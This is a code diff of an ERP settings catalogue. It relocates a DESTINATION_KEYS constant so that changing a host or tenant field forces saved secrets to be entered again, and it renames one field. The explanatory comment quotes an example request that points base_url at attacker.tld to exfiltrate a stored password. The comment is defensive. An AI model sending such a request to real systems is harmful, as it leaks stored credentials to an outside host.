@@ -56,6 +56,25 @@ _EXISTING_LABEL_KEYS: dict[str, str] = {
 }
 
 
+#: ``settings.erp`` keys that say WHERE the stored credentials are sent: the
+#: host itself (``base_url``), or a value an adapter builds the host or the
+#: target books from (NetSuite's ``account_id`` is a hostname label; Business
+#: Central's ``tenant_id`` / ``environment`` / ``company_id`` are URL path
+#: segments; QuickBooks' ``environment`` picks its API host; SYSPRO and Intacct
+#: log in to ``company_id``). A save that changes any of them is a NEW
+#: connection: a blank, masked or omitted secret is not carried forward and has
+#: to be typed again (the inbound webhook key, :data:`EXTRA_SECRET_KEYS`, is
+#: never sent outbound and so survives). Without this, ``{"type": "syspro", "base_url":
+#: "https://attacker.tld", "operator_password": "********"}`` from an admin (or
+#: a stolen admin token) sent the stored password to attacker.tld through
+#: ``POST /organization/test-erp`` or a settings PATCH. A catalogue field that
+#: names a host belongs here: ``tests/test_erp_catalog.py`` fails on any
+#: ``*_url`` / ``*host*`` field left out.
+DESTINATION_KEYS: frozenset[str] = frozenset(
+    {"base_url", "tenant_id", "account_id", "company_id", "environment"}
+)
+
+
 def _field(
     name: str,
     *,
@@ -72,6 +91,9 @@ def _field(
         "label_key": label_key or _EXISTING_LABEL_KEYS.get(name, f"org.erp.field.{name}"),
         "secret": secret,
         "required": required,
+        # Changing a destination field starts a new connection: the form then
+        # asks for the secrets again rather than claiming they are kept.
+        "destination": name in DESTINATION_KEYS,
     }
     if placeholder is not None:
         out["placeholder"] = placeholder
@@ -159,7 +181,7 @@ ERP_PROVIDERS: list[dict[str, Any]] = [
             _field("company_id"),
             # The API reports currency only as numeric ids, so this is the one
             # place an ISO code for the company's own currency comes from.
-            _field("home_currency", required=False, placeholder="ZAR"),
+            _field("company_currency", required=False, placeholder="ZAR"),
             # Only a Sage partner reaches another host; blank uses the adapter's
             # default, Sage's South African API (``DEFAULT_API_BASE``).
             _field(
@@ -360,25 +382,6 @@ def mask_erp_config(erp_config: Any) -> Any:
 
 def _is_blank(value: Any) -> bool:
     return value == SECRET_MASK or (isinstance(value, str) and not value.strip())
-
-
-#: ``settings.erp`` keys that say WHERE the stored credentials are sent: the
-#: host itself (``base_url``), or a value an adapter builds the host or the
-#: target books from (NetSuite's ``account_id`` is a hostname label; Business
-#: Central's ``tenant_id`` / ``environment`` / ``company_id`` are URL path
-#: segments; QuickBooks' ``environment`` picks its API host; SYSPRO and Intacct
-#: log in to ``company_id``). A save that changes any of them is a NEW
-#: connection: a blank, masked or omitted secret is not carried forward and has
-#: to be typed again (the inbound webhook key, :data:`EXTRA_SECRET_KEYS`, is
-#: never sent outbound and so survives). Without this, ``{"type": "syspro", "base_url":
-#: "https://attacker.tld", "operator_password": "********"}`` from an admin (or
-#: a stolen admin token) sent the stored password to attacker.tld through
-#: ``POST /organization/test-erp`` or a settings PATCH. A catalogue field that
-#: names a host belongs here: ``tests/test_erp_catalog.py`` fails on any
-#: ``*_url`` / ``*host*`` field left out.
-DESTINATION_KEYS: frozenset[str] = frozenset(
-    {"base_url", "tenant_id", "account_id", "company_id", "environment"}
-)
 
 
 def _destination_value(value: Any) -> Any:
